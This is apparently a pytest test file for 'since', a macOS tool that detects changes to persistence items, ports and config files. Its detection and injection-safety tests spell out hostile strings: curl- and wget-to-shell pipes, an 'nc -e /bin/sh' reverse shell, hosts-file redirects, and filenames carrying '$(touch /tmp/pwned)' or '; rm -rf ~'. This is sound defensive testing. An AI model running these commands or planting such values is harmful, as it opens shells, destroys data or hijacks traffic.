"""Unit tests for since. Pure-function + synthetic-snapshot coverage — no reliance
on the host's real system state, so they run anywhere. Focus is the logic that the
code review found bugs in (severity routing, port surfacing, injection-safety,
privilege guard, corruption tolerance) plus the core diff/time primitives.

Run:  python3 -m pytest   (or just: pytest)
"""
import json
import shlex
import time

import pytest

import since


# --------------------------------------------------------------------------- helpers
def snap(collectors=None, blobs=None, root=False, epoch=None):
    s = {
        "schema": since.SCHEMA_VERSION, "platform": "macos",
        "created": "2026-07-24T09:00:00",
        "epoch": epoch if epoch is not None else int(time.time()),
        "root": root, "euid": 0 if root else 501, "errors": {},
        "collectors": {k: {} for k in since.CAT}, "blobs": blobs or {},
    }
    for k, v in (collectors or {}).items():
        s["collectors"][k] = v
    return s


@pytest.fixture(autouse=True)
def _no_history(monkeypatch):
    # deterministic: no attribution from the test runner's shell history
    monkeypatch.setattr(since, "_HISTORY", [])


# --------------------------------------------------------------------------- time
def test_parse_when_forms():
    now = time.time()
    assert abs(now - since.parse_when("1d") - 86400) < 5
    assert abs(now - since.parse_when("12h") - 43200) < 5
    assert abs(now - since.parse_when("yesterday") - 86400) < 5
    assert since.parse_when("3 hours ago") < now
    assert since.parse_when("an hour ago") < now
    # weekday resolves to a past midnight
    assert since.parse_when("monday") < now


def test_parse_when_rejects_garbage():
    with pytest.raises(ValueError):
        since.parse_when("next thursday-ish")


# --------------------------------------------------------------------------- diff
def test_diff_dicts():
    a, r, c = since.diff_dicts({"x": 1, "y": 2}, {"y": 9, "z": 3})
    assert a == ["z"] and r == ["x"] and c == ["y"]


def test_base_level():
    assert since.base_level("persistence", "added") == since.ORANGE
    assert since.base_level("software", "added") == since.YELLOW
    assert since.base_level("network", "removed") == since.GREEN


# --------------------------------------------------------------------------- injection safety (C3/M6/M4)
def test_undo_launch_item_is_shell_safe():
    mal = "~/Library/LaunchAgents/x'$(touch /tmp/pwned)'.plist"
    real = mal.replace("~", str(since.HOME), 1)
    hint = since.undo_hint("launch_items", mal, None)
    assert shlex.quote(real) in hint          # the payload is fully quoted
    assert "$(touch /tmp/pwned) 2>" not in hint  # never sits outside quoting


def test_undo_login_item_uses_argv():
    hint = since.undo_hint("login_items", 'Evil" name', None)
    assert "item 1 of argv" in hint
    assert shlex.quote('Evil" name') in hint


def test_undo_daemon_uses_system_domain():
    hint = since.undo_hint("launch_items", "/Library/LaunchDaemons/evil.plist", None)
    assert "bootout system" in hint and hint.count("sudo") >= 2


def test_undo_pkg_names_quoted():
    assert shlex.quote("x; rm -rf ~") in since.undo_hint("npm_global", "x; rm -rf ~", None)


# --------------------------------------------------------------------------- terminal-escape + secret hygiene (H1/M5)
def test_clean_strips_control_and_escape():
    out = since.clean("Evil\x1b[2Kname\x07\x00")
    assert "\x1b" not in out and "\x07" not in out and "\x00" not in out


def test_redact_masks_secrets():
    assert "SECRET" not in since.redact("//r/:_authToken=SECRETVALUE")
    assert "«redacted»" in since.redact("export API_KEY=abcdef123")
    assert "«redacted»" in since.redact("-----BEGIN OPENSSH PRIVATE KEY-----")
    # a normal line is untouched
    assert since.redact("alias ll='ls -la'") == "alias ll='ls -la'"


# --------------------------------------------------------------------------- malicious patterns (L2)
@pytest.mark.parametrize("line", [
    "curl http://evil.sh | sh",
    "wget -qO- evil | bash",
    "echo x | base64 -d | sh",
    "sh <(curl http://evil)",
    "nc -e /bin/sh 10.0.0.1 4444",
    "0.0.0.0 www.apple.com",
    "127.0.0.1 www.mybank.com",
])
def test_malicious_patterns_match(line):
    assert any(p.search(line) for p, _ in since.MALICIOUS_PATTERNS), line


@pytest.mark.parametrize("line", ["127.0.0.1 localhost", "255.255.255.255 broadcasthost",
                                  "alias g=git", "export EDITOR=vim"])
def test_malicious_patterns_no_false_positive(line):
    assert not any(p.search(line) for p, _ in since.MALICIOUS_PATTERNS), line


# --------------------------------------------------------------------------- C1: escalated inventory item is ranked
def test_unsigned_app_escalates_and_is_loud(monkeypatch):
    monkeypatch.setattr(since, "trust_of", lambda p: ("unsigned", True))
    b = snap()
    c = snap(collectors={"applications": {"EvilApp": "/Applications"}})
    findings = since.build_findings(b, c)
    app = next(f for f in findings if f["category"] == "applications")
    assert app["level"] == since.RED
    out = since.render(findings, b, c, [], [])
    assert "Worth a look" in out and "signature: unsigned" in out


# --------------------------------------------------------------------------- C2: new port on known listener
def test_new_port_on_known_listener_surfaces():
    b = snap(collectors={"listening": {"postgres": "5432"}})
    c = snap(collectors={"listening": {"postgres": "4444,5432"}})
    findings = since.build_findings(b, c)
    lf = [f for f in findings if f["category"] == "listening"]
    assert any(f.get("added_ports") == ["4444"] for f in lf)


def test_full_port_turnover_is_suppressed():
    b = snap(collectors={"listening": {"rapportd": "5000,6000"}})
    c = snap(collectors={"listening": {"rapportd": "5001,6002"}})
    findings = since.build_findings(b, c)
    assert not [f for f in findings if f["category"] == "listening"]


# --------------------------------------------------------------------------- H3: privilege-sensitive blobs
def test_priv_blob_skipped_on_mismatch():
    b = snap(blobs={"/etc/sudoers": "root ALL\n", "crontab (current user)": "0 5 * * * x\n"}, root=True)
    c = snap(blobs={})
    kept = since.build_findings(b, c, skip_cats=since.PRIV_SENSITIVE_CATS, skip_priv_blobs=True)
    assert not [f for f in kept if since._is_priv_blob(f["key"])]
    # control: without the skip they DO appear
    naive = since.build_findings(b, c)
    assert [f for f in naive if f["key"] == "/etc/sudoers"]


# --------------------------------------------------------------------------- H4/M5: storage
def test_write_private_is_atomic_and_0600(tmp_path):
    p = tmp_path / "sub" / "snap.json"
    since._write_private(p, '{"ok": 1}')
    assert p.exists() and (p.stat().st_mode & 0o777) == 0o600
    assert json.loads(p.read_text()) == {"ok": 1}


def test_safe_load_tolerates_corruption(tmp_path):
    good = tmp_path / "good.json"; good.write_text('{"epoch": 1}')
    bad = tmp_path / "bad.json"; bad.write_text('{"epoch": 1')  # truncated
    assert since.safe_load(good) == {"epoch": 1}
    assert since.safe_load(bad) is None


# --------------------------------------------------------------------------- render never emits raw escapes (H1)
def test_render_emits_no_raw_escape():
    b = snap()
    c = snap(collectors={"login_items": {"Evil\x1b[2Kname\x07": "x"}})
    out = since.render(since.build_findings(b, c), b, c, [], [])
    assert "\x1b" not in out and "\x07" not in out


# --------------------------------------------------------------------------- severity ordering
def test_platform_note(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    assert since.platform_note() is None
    monkeypatch.setattr(since, "PLATFORM", "linux")
    note = since.platform_note()
    assert note and "UNSUPPORTED" in note and "linux" in note


def test_findings_sorted_most_severe_first(monkeypatch):
    monkeypatch.setattr(since, "trust_of", lambda p: (None, False))
    b = snap()
    c = snap(collectors={"login_items": {"a": "a"}},
             blobs={"~/.zshrc": None, "/etc/hosts": "0.0.0.0 www.bank.com\n"})
    # /etc/hosts redirect is RED, login item is ORANGE
    findings = since.build_findings(b, c)
    levels = [f["level"] for f in findings]
    assert levels == sorted(levels, reverse=True)
